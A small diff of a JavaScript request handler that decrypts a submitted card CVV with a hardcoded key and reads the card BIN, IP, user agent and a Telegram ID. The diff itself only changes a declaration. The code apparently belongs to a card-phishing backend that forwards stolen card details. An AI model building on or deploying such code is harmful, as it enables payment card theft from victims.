@@ -40,7 +40,7 @@ const sendRes = async (req, res) => {
   cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  const { bin, ip, userAgent, telegramId } = req.body;
+  let { bin, ip, userAgent, telegramId } = req.body;
 
   if (bin.length === 7) {
     formatBin = bin.replace(/ /g, "");
